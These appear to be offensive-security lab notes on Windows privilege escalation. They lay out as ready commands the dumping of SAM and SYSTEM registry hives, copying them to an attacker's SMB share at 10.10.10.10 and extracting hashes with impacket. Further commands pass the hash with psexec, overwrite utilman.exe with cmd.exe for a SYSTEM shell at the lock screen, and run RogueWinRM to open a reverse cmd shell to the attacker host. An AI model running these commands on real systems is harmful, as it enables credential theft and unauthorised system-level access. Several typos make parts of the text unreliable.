# Pass The Hash Attack

1. Backup SAM & SYSTEM Hashes

```sh
reg save hklm\system C:\Users\Backup\system.hive
reg save hklm\sam C:\Users\Backup\sam.hive
```

2. Setup an SMB server on the attacking machine
- Create a directory name `share`
- Spin up an SMB server using impacket.

```sh
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username myusername -password mypassword public share
```

3. Copy files over SMB
```sh
copy C:\Users\Backup\sam.hive \\10.10.10.10\public\
copy C:\Users\Backup\system.hive \\10.10.10.10\public\
```

4. Retrieve password hashes:
```sh
cd share
pyhton3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

5. Pass the Hash
We will use the administrators hash to gain access to SYSTEM privileges.
```sh
python3.9 /opt/impacket/examples/psexec.py -hashes <HASH VALUE> admin@10.10.10.10
```

6. SeTakeOwnership
This privilege allows a user to take ownership of any object on system. We will  be attacking `utilman.exe` sinc eit is run with SYSTEM privileges.

The `takeown` command allows an administrator to recover access to a file by changing ownership to administrator.
```sh
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant USERNAME:F
copy cmd.exe utilman.exe
```

7. Lock the device and perform the exploit.
Utilman.exe provides ease of access options during the lock screen. We will need to lock the device and run "Eas of Access" to get a cmd prompt with system privileges.

## SeImpersonate / SeAssignPrimaryToken
These privileges will allow a process to impersonate other users and act on their behalf. In Windows systems, yo uwill find that the `LOCAL SERVICE` and `NETWORK SERVICE ACCOUNTS` have these privileges.

1. Spawn a process so that users can connect and authenticate
2. Fore privileged users to connect and authenticate to the spawned process.

### Example using compromised web service
We've already gained inital access on a webserver and planted a shell. 

RogueWinRM exploit
- Starts the BITS service in windows
- Automatically creates a connection to port 5985 
- Uses SYSTEM privileges
- port 
- 5985 is used to expose powershell console over the network

If WinRM service isn't running on the victim server, an attacker can start a fake service on port 5985 and capture the authentication attempt.

`RogueWinRM.exe -p "exploit.exe" -a "-e cmd.exe 10.10.10.10 4442"`

`-p` - specifies the exe to be run by the exploit
`-a` - pass arguments
`-e cmd.exe 10.10.10.10` - Reverse shell using cmd


